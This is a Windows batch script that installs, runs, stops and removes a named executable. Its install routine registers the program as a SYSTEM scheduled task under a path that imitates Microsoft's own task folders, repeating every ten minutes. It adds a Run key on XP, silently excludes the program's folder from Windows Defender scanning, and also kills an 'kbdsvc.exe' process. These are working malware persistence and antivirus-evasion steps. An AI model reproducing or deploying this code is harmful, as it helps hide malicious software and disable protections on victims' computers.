@echo off
endlocal& setlocal EnableDelayedExpansion

set self_dir=%~dp0
reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=x86|| set OS=x64
ver | find /i "5." > nul && set XP=1|| set XP=0

rem Parse passed arguments to script
:parse_passed_params
  if "%~1"=="" goto:end_parse_passed_params
  if "%~1"=="install"           ( set Action="%~1" && shift & goto:parse_passed_params )
  if "%~1"=="uninstall"         ( set Action="%~1" && shift & goto:parse_passed_params )
  if "%~1"=="stop"              ( set Action="%~1" && shift & goto:parse_passed_params )
  if "%~1"=="run"               ( set Action="%~1" && shift & goto:parse_passed_params )
  if not "%~1"==""              ( set Progra="%~1" && shift & goto:parse_passed_params )
  shift & goto:parse_passed_params
:end_parse_passed_params

:begin
    if %Progra%==""        	 goto:end  
    if %Action%=="install"   call:install %Progra%
    if %Action%=="uninstall" call:uninstall %Progra%
    if %Action%=="stop"      call:stop %Progra%
    if %Action%=="run"       call:run %Progra%
    goto:end
	
:install
    if "%~1"=="" exit /b 1
	set name=%~1
    set dst=%ALLUSERSPROFILE%\%name%
 
    call:createtask %name%
	call:exclude_from_defender %name%
    exit /b
    
:uninstall
    if "%~1"=="" exit /b 1
	set name=%~1
    set dst=%ALLUSERSPROFILE%\%name%
    set task_root=\Microsoft\Windows\%name%
    
    call:stop %name% 
    
    if "%XP%"=="1" (
        schtasks /DELETE /TN "%name%"
    )
    
    schtasks /DELETE /F /TN "%task_root%\%name%"
    reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "%name%" /f
    rmdir /Q /S "%dst%"
    exit /b
    
:stop
    if "%~1"=="" exit /b 1
	set name=%~1
    set dst=%ALLUSERSPROFILE%\%name%
    set task_root=\Microsoft\Windows\%name%
    set kbdsvc=kbdsvc
    
    schtasks /END /TN "%name%"
    schtasks /END /TN "%task_root%\%name%"
    taskkill /F /IM "%name%.exe"  
    taskkill /F /IM "%kbdsvc%.exe"
    exit /b
    
:run
    if "%~1"=="" exit /b 1
	set name=%~1
    set dst=%ALLUSERSPROFILE%\%name%
    set task_root=\Microsoft\Windows\%name%
    if "%XP%"=="1" (
		start /B /I cmd /C "%dst%\%name%.exe"
		exit /b
	)
    schtasks /RUN /TN "%task_root%\%name%"
    exit /b
	
:createtask
	if "%~1"=="" exit /b 1
	set name=%~1
	set dst=%ALLUSERSPROFILE%\%name%
	set xml="%dst%\task.xml"
	set task_root=\Microsoft\Windows\%name%
	
    if "%XP%"=="1" (
		reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%name%" /d "%dst%\%name%.exe" /f>nul
        rem schtasks /DELETE /TN "%name%"
        rem schtasks /Create /RU System /SC ONLOGON /TN "%name%" /TR "%dst%\%name%.exe"        
        exit /b
    )    
	
	echo ^<?xml version="1.0" encoding="UTF-16"?^>^
		^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>^
		^<Triggers^>^
		^<LogonTrigger^>^
		^<Repetition^>^
		^<Interval^>PT10M^</Interval^>^
		^<StopAtDurationEnd^>false^</StopAtDurationEnd^>^
		^</Repetition^>^
		^<Enabled^>true^</Enabled^>^
		^</LogonTrigger^>^
		^</Triggers^>^
		^<Principals^>^
		^<Principal id="Author"^>^
		^<UserId^>S-1-5-18^</UserId^>^
		^<RunLevel^>HighestAvailable^</RunLevel^>^
		^</Principal^>^
		^</Principals^>^
		^<Settings^>^
		^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>^
		^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>^
		^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>^
		^<AllowHardTerminate^>true^</AllowHardTerminate^>^
		^<StartWhenAvailable^>false^</StartWhenAvailable^>^
		^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>^
		^<IdleSettings^>^
		^<StopOnIdleEnd^>true^</StopOnIdleEnd^>^
		^<RestartOnIdle^>false^</RestartOnIdle^>^
		^</IdleSettings^>^
		^<AllowStartOnDemand^>true^</AllowStartOnDemand^>^
		^<Enabled^>true^</Enabled^>^
		^<Hidden^>false^</Hidden^>^
		^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>^
		^<WakeToRun^>false^</WakeToRun^>^
		^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>^
		^<Priority^>7^</Priority^>^
		^</Settings^>^
		^<Actions Context="Author"^>^
		^<Exec^>^
		^<Command^>%dst%\%name%.exe^</Command^>^
		^</Exec^>^
		^</Actions^>^
		^</Task^> > %xml%
	
	schtasks /Create /F /XML %xml% /TN "%task_root%\%name%"
	del /F /Q %xml%
	
	exit /b
	
:exclude_from_defender
	if "%~1"=="" exit /b 1
	set name=%~1
	set dst=%ALLUSERSPROFILE%\%name%
	powershell -ExecutionPolicy RemoteSigned -NoLogo -Noninteractive -Command "try { Add-MpPreference -ExclusionPath %dst%; exit 100; } catch { exit 0; }">nul 2>&1
	
	exit /b
	
:end
    exit 0


